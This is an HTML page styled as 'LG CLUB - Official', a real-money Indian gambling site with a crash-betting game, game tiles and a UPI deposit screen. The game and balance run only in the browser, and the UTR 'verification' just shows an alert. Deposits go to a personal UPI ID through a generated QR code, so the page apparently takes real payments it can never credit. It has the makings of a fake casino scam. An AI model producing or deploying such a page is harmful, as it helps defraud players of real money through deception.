<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LG CLUB - Official</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        :root { --gold: #ffdf8e; --red: #ff4444; --dark: #0b0505; --card: #1f0d0d; --green: #28a745; }
        body { background: var(--dark); color: #fff; font-family: sans-serif; margin: 0; user-select: none; }
        
        /* Header [PDF Page 1] */
        .header { background: #350a0a; padding: 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--gold); position: sticky; top: 0; z-index: 100; }
        .bal-box { background: rgba(0,0,0,0.6); padding: 5px 15px; border-radius: 20px; border: 1px solid var(--gold); color: var(--gold); font-weight: bold; }

        /* GoRush Engine [PDF Page 1] */
        .game-section { padding: 15px; text-align: center; }
        .crash-screen { background: radial-gradient(circle, #410a0a 0%, #000 100%); height: 200px; border-radius: 15px; border: 1px solid #4d1a1a; display: flex; flex-direction: column; justify-content: center; position: relative; overflow: hidden; }
        #multi-display { font-size: 50px; font-weight: 800; color: var(--gold); }
        #rocket { font-size: 30px; position: absolute; bottom: 20px; left: 20px; transition: 0.1s linear; }

        /* Betting Controls */
        .bet-area { background: var(--card); padding: 15px; border-radius: 15px; margin: 10px; border: 1px solid #3d1a1a; }
        .input-box { width: 100%; padding: 12px; background: #000; border: 1px solid #5a2d2d; color: var(--gold); border-radius: 8px; font-size: 18px; text-align: center; margin-bottom: 10px; box-sizing: border-box; }
        .btn-main { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; background: linear-gradient(180deg, #ffdf8e, #c69433); color: #000; }
        .btn-cashout { background: var(--green) !important; color: #fff !important; }

        /* Turbo Grid [PDF Page 9-10] */
        .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 15px; }
        .game-card { background: var(--card); border-radius: 10px; padding: 8px; text-align: center; border: 1px solid #3d1a1a; position: relative; }
        .game-card img { width: 100%; border-radius: 5px; opacity: 0.8; }
        .game-name { font-size: 10px; margin-top: 5px; color: #ccc; }
        .tag { position: absolute; top: 5px; left: 5px; background: red; font-size: 8px; padding: 2px 5px; border-radius: 3px; }

        /* Deposit Modal */
        #deposit-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--dark); z-index: 200; display: none; padding: 20px; box-sizing: border-box; text-align: center; }
        .qr-frame { background: #fff; padding: 10px; width: 180px; height: 180px; margin: 20px auto; border-radius: 10px; }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="header">
        <div style="font-weight:bold; color: var(--gold);">LG CLUB</div>
        <div class="bal-box">₹<span id="balance">10.00</span></div>
        <button onclick="toggleDeposit(true)" style="background: var(--green); border:none; color:#fff; padding: 5px 12px; border-radius: 5px; font-weight: bold;">Deposit</button>
    </div>

    <div class="game-section">
        <div class="crash-screen">
            <div id="status-label" style="font-size: 12px; color: #888;">Next Round in 3s...</div>
            <div id="multi-display">1.00x</div>
            <div id="rocket">🚀</div>
        </div>

        <div class="bet-area">
            <input type="number" id="bet-amt" class="input-box" value="10">
            <button id="action-btn" class="btn-main" onclick="handleBet()">BET</button>
        </div>
    </div>

    <div style="padding-left: 15px; font-size: 12px; color: #888;">TURBO GAMES</div>
    <div class="grid-container">
        <div class="game-card">
            <span class="tag">HOT</span>
            <img src="https://i.imgur.com/B7yM7yM.jpg">
            <div class="game-name">Turbo Mines</div>
        </div>
        <div class="game-card">
            <img src="https://i.imgur.com/pYvV8vV.jpg">
            <div class="game-name">Aviator</div>
        </div>
        <div class="game-card">
            <img src="https://i.imgur.com/yourpoker.jpg">
            <div class="game-name">Dice Twice</div>
        </div>
    </div>

    <div id="deposit-modal">
        <button onclick="toggleDeposit(false)" style="float: left; background: none; border: none; color: #fff; font-size: 25px;">⬅️</button>
        <h2 style="color: var(--gold);">Deposit Cash</h2>
        <div id="qrcode" class="qr-frame"></div>
        <p>UPI ID: <b>7470807k@nyes</b></p>
        <input type="number" id="utr-input" class="input-box" placeholder="Enter 12 Digit UTR">
        <button class="btn-main" onclick="alert('Sent for Verification!')">SUBMIT</button>
    </div>

<script>
    let bal = 10.00;
    let multiplier = 1.00;
    let isLive = false;
    let betPlaced = false;
    let gameInterval;
    let upiID = "7470807k@nyes";

    function toggleDeposit(show) {
        const modal = document.getElementById('deposit-modal');
        modal.style.display = show ? 'block' : 'none';
        if(show) {
            document.getElementById('qrcode').innerHTML = "";
            new QRCode(document.getElementById("qrcode"), { text: `upi://pay?pa=${upiID}&pn=LGCLUB&am=100&cu=INR`, width: 180, height: 180 });
        }
    }

    function handleBet() {
        const btn = document.getElementById('action-btn');
        const amt = parseFloat(document.getElementById('bet-amt').value);

        if(!isLive && !betPlaced) {
            if(amt > bal) return alert("Low Balance!");
            bal -= amt;
            document.getElementById('balance').innerText = bal.toFixed(2);
            betPlaced = true;
            btn.innerText = "WAITING...";
            btn.style.opacity = "0.5";
        } else if(isLive && betPlaced) {
            // Cashout
            let win = amt * multiplier;
            bal += win;
            document.getElementById('balance').innerText = bal.toFixed(2);
            betPlaced = false;
            btn.innerText = "WIN: ₹" + win.toFixed(2);
            btn.classList.add('btn-cashout');
            setTimeout(() => { btn.classList.remove('btn-cashout'); btn.innerText = "BET"; }, 2000);
        }
    }

    function runGame() {
        let crashPoint = (Math.random() * 4 + 1.1).toFixed(2);
        isLive = true;
        multiplier = 1.00;
        document.getElementById('status-label').innerText = "LIVE";
        const btn = document.getElementById('action-btn');
        if(betPlaced) { btn.innerText = "CASH OUT"; btn.style.opacity = "1"; }

        gameInterval = setInterval(() => {
            multiplier += 0.01;
            document.getElementById('multi-display').innerText = multiplier.toFixed(2) + "x";
            
            // Rocket motion
            let rocket = document.getElementById('rocket');
            rocket.style.left = (20 + (multiplier-1)*30) + "px";
            rocket.style.bottom = (20 + (multiplier-1)*40) + "px";

            if(multiplier >= crashPoint) {
                clearInterval(gameInterval);
                isLive = false;
                document.getElementById('multi-display').style.color = "red";
                document.getElementById('status-label').innerText = "CRASHED @ " + crashPoint + "x";
                if(betPlaced) { btn.innerText = "LOST!"; betPlaced = false; }
                
                setTimeout(() => {
                    document.getElementById('multi-display').innerText = "1.00x";
                    document.getElementById('multi-display').style.color = "var(--gold)";
                    rocket.style.left = "20px"; rocket.style.bottom = "20px";
                    btn.innerText = "BET";
                    document.getElementById('status-label').innerText = "Next Round in 3s...";
                    setTimeout(runGame, 3000);
                }, 3000);
            }
        }, 100);
    }

    // Start Engine
    setTimeout(runGame, 3000);
</script>
</body>
</html>
